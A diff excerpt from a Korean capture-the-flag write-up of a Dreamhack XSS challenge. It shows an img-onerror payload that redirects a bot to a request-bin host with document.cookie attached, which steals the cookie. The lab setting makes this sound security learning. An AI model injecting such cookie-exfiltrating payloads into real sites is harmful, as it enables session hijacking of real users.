@@ -31,6 +31,7 @@ https://tools.dreamhack.games/main
 ```
 https://qwtdbvz.request.dreamhack.games?document.cookie
 ```
+
 <br>
 이 곳으로 접속하면, 쿠키값을 가진채로 그냥 봇이 접속 할 것 같다.   
 vuln 페이지에서 xss 공격을 하기 위해서는 img 태그를 사용했었다.   
@@ -39,6 +40,7 @@ vuln 페이지에서 xss 공격을 하기 위해서는 img 태그를 사용했�
 ```
 <img src="/" onerror="location.href='https://qwtdbvz.request.dreamhack.games?'+document.cookie">
 ```
+
 <br>
 바로 주입시켜보았다.   
 <br><br>
